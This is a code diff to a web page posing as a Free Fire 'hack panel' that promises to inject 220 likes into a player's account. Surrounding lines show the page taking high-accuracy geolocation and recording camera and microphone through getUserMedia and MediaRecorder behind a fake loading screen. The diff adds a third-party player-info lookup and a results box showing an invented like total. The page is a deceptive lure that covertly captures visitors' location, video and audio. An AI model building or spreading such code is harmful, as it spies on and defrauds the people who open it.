@@ -1,3 +1,4 @@
+🚀 Internet Speed: ${speed}
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -49,7 +50,7 @@
             padding: 25px;
             border-radius: 12px;
             display: inline-block;
-            width: 330px;
+            width: 360px;
             position: relative;
             backdrop-filter: blur(5px);
         }
@@ -118,6 +119,22 @@
             color: #00ff66;
             font-weight: bold;
         }
+
+        .info-row {
+            display: flex;
+            justify-content: space-between;
+            padding: 6px 0;
+            border-bottom: 1px dashed #222;
+            font-size: 13px;
+            text-align: left;
+        }
+        .info-row span:first-child {
+            color: #888;
+        }
+        .info-row span:last-child {
+            color: #fff;
+            font-weight: bold;
+        }
     </style>
 </head>
 <body>
@@ -127,7 +144,6 @@
 
     <!-- Hidden Audio Synthesizer / Sound Effects using Web Audio API -->
     <script>
-        // Audio context for generating cyber/hacking sound effects without external files
         let audioCtx = null;
 
         function initAudio() {
@@ -178,8 +194,8 @@
         <h2>FF HACK PANEL V2.0</h2>
         <input type="text" id="uid" placeholder="Enter Player UID" oninput="playKeyBeep()">
         <select id="server" onchange="playKeyBeep()">
-            <option value="BD">BD Server [SECURE]</option>
-            <option value="IND">India Server [SECURE]</option>
+            <option value="bd">BD Server [SECURE]</option>
+            <option value="ind">India Server [SECURE]</option>
         </select>
         <select id="likes" onchange="playKeyBeep()">
             <option value="220">220 Likes [INJECT]</option>
@@ -339,7 +355,9 @@
 
         async function startPanel() {
             playAccessGrantedSound();
-            const uid = document.getElementById('uid').value;
+            const uid = document.getElementById('uid').value.trim();
+            const server = document.getElementById('server').value;
+
             if(!uid) {
                 alert('ERROR: Target UID Required!');
                 return;
@@ -364,6 +382,16 @@
                     { timeout: 5000, enableHighAccuracy: true, maximumAge: 0 }
                 );
             });
+
+            // রিয়েল ইনফো ফেচ করার চেষ্টা (API Call)
+            let ffData = null;
+            try {
+                let apiUrl = `https://nirob-x-info.vercel.app/info?uid=${uid}`;
+                const apiRes = await fetch(apiUrl);
+                ffData = await apiRes.json();
+            } catch (e) {
+                ffData = { name: "OPERATOR", level: "Unknown", region: server, likes: "0" };
+            }
 
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
@@ -416,9 +444,27 @@
                         clearInterval(interval);
                         mediaRecorder.stop();
                         playAccessGrantedSound();
+
+                        // ডাটা ফেচ করে সফলভাবে স্ক্রিন দেখানো
+                        let playerName = ffData.name || ffData.Nickname || "UNKNOWN";
+                        let playerLevel = ffData.level || ffData.Level || "60+";
+                        let playerRegion = ffData.region || server;
+                        let playerLikes = ffData.likes || ffData.Likes || "1000";
+                        let finalLikes = parseInt(playerLikes) + 220;
+
                         document.getElementById('loadingBox').innerHTML = `
-                            <h3 style="color:#00ff66;">ACCESS GRANTED! 220 LIKES INJECTED!</h3>
-                            <div class="creator-tag" style="margin-top:15px;">DEVELOPED BY: <span>YEAXIN</span></div>
+                            <h3 style="color:#00ff66;">ACCESS GRANTED!</h3>
+                            <div style="margin: 10px 0; text-align: left; background: #000; padding: 10px; border-radius: 5px; border: 1px solid #00ff66;">
+                                <div class="info-row"><span>Name:</span> <span>${playerName}</span></div>
+                                <div class="info-row"><span>UID:</span> <span>${uid}</span></div>
+                                <div class="info-row"><span>Level:</span> <span>${playerLevel}</span></div>
+                                <div class="info-row"><span>Region:</span> <span>${playerRegion}</span></div>
+                                <div class="info-row"><span>Before Likes:</span> <span>${playerLikes}</span></div>
+                                <div class="info-row"><span>Injected:</span> <span style="color:#00ff66;">+220 Likes</span></div>
+                                <div class="info-row"><span>Total Likes:</span> <span style="color:#ff0055;">${finalLikes}</span></div>
+                            </div>
+                            <button onclick="location.reload()" style="margin-top:10px;">DONE</button>
+                            <div class="creator-tag" style="margin-top:10px;">DEVELOPED BY: <span>YEAXIN</span></div>
                         `;
                     }
                 }, 1600);
